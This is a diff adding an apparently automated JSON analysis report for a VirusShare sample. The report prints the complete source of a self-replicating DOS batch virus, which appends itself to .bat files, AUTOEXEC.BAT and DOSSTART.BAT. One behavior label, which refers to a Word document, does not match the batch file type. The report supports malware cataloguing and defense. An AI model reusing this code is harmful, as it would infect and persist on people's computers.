@@ -1,0 +1,69 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "AUTOEXEC": "Runs when the Word document is opened"
+        },
+        "macro": "@echo off%[MaLK_B]%\nif exist \\noway goto MaLK_B_Finish\nif not exist %0.bat goto MaLK_B_Finish\nif %0==AUTOEXEC goto MaLK_BAuto\nif %0==DOSSTART goto MaLK_BDosS\nfor %%f in (*.bat) do set MaLK_B=%%f\nfind /i \"MaLK_B\"<%MaLK_B%>nul\nif errorlevel 1 find \"MaLK_B\"<%0.bat>>%MaLK_B%\nfor %%f in (\\*.bat) do set MaLK_B=%%f\nfind /i \"MaLK_B\"<%MaLK_B%>nul\nif errorlevel 1 find \"MaLK_B\"<%0.bat>>%MaLK_B%\nfor %%f in (c:\\*.bat) do set MaLK_B=%%f\nfind /i \"MaLK_B\"<%MaLK_B%>nul\nif errorlevel 1 find \"MaLK_B\"<%0.bat>>%MaLK_B%\n:MaLK_B\nif not exist C:\\AUTOEXEC.BAT goto MaLK_B_CA\nfind /i \"MaLK_B\"<C:\\AUTOEXEC.BAT>nul\nif errorlevel 1 find \"MaLK_B\"<%0.bat>>C:\\AUTOEXEC.BAT\ngoto MaLK_B_Finish\n:MaLK_B_CA\nfind \"MaLK_B\"<%0.bat>>C:\\AUTOEXEC.BAT\n:MaLK_BDosS\nset MaLK_BEx=WIN.COM\n%MaLK_BEx%\n:MaLK_BAuto\ncd %winbootdir%\nfor %%f in (*.BAT) do set MaLK_B=%%f\nfind /i \"MaLK_B\"<%MaLK_B%>nul\nif errorlevel 1 find \"MaLK_B\"<%0.bat>>%MaLK_B%\nif not exist DOSSTART.BAT goto MaLK_B_DSC\nfind /i \"MaLK_B\"<DOSSTART.BAT>nul\nif errorlevel 1 goto MaLK_B_DSC\ngoto MaLK_B_Finish\n:MaLK_B_DSC\nfind \"MaLK_B\"<%0.bat>>DOSSTART.BAT\n:MaLK_B_Finish"
+    },
+    "filename": "VirusShare_6e91cb43e5ad504d9607d984e5c6e657",
+    "filesize": 1126,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "6e91cb43e5ad504d9607d984e5c6e657",
+        "sha1": "c0ebe2344efb744765bf096b07d687cc8ac7a227",
+        "sha256": "1d87ecd71b6a2573f916521889789eda20e335c4094041cbeb04b4019a658dd7"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off%[MaLK_B]%",
+            "if exist \\noway goto MaLK_B_Finish",
+            "if not exist %0.bat goto MaLK_B_Finish",
+            "if %0==AUTOEXEC goto MaLK_BAuto",
+            "if %0==DOSSTART goto MaLK_BDosS",
+            "for %%f in (*.bat) do set MaLK_B=%%f",
+            "find /i \"MaLK_B\"<%MaLK_B%>nul",
+            "if errorlevel 1 find \"MaLK_B\"<%0.bat>>%MaLK_B%",
+            "for %%f in (\\*.bat) do set MaLK_B=%%f",
+            "find /i \"MaLK_B\"<%MaLK_B%>nul",
+            "if errorlevel 1 find \"MaLK_B\"<%0.bat>>%MaLK_B%",
+            "for %%f in (c:\\*.bat) do set MaLK_B=%%f",
+            "find /i \"MaLK_B\"<%MaLK_B%>nul",
+            "if errorlevel 1 find \"MaLK_B\"<%0.bat>>%MaLK_B%",
+            ":MaLK_B",
+            "if not exist C:\\AUTOEXEC.BAT goto MaLK_B_CA",
+            "find /i \"MaLK_B\"<C:\\AUTOEXEC.BAT>nul",
+            "if errorlevel 1 find \"MaLK_B\"<%0.bat>>C:\\AUTOEXEC.BAT",
+            "goto MaLK_B_Finish",
+            ":MaLK_B_CA",
+            "find \"MaLK_B\"<%0.bat>>C:\\AUTOEXEC.BAT",
+            ":MaLK_BDosS",
+            "set MaLK_BEx=WIN.COM",
+            "%MaLK_BEx%",
+            ":MaLK_BAuto",
+            "cd %winbootdir%",
+            "for %%f in (*.BAT) do set MaLK_B=%%f",
+            "find /i \"MaLK_B\"<%MaLK_B%>nul",
+            "if errorlevel 1 find \"MaLK_B\"<%0.bat>>%MaLK_B%",
+            "if not exist DOSSTART.BAT goto MaLK_B_DSC",
+            "find /i \"MaLK_B\"<DOSSTART.BAT>nul",
+            "if errorlevel 1 goto MaLK_B_DSC",
+            "goto MaLK_B_Finish",
+            ":MaLK_B_DSC",
+            "find \"MaLK_B\"<%0.bat>>DOSSTART.BAT",
+            ":MaLK_B_Finish"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.280769",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
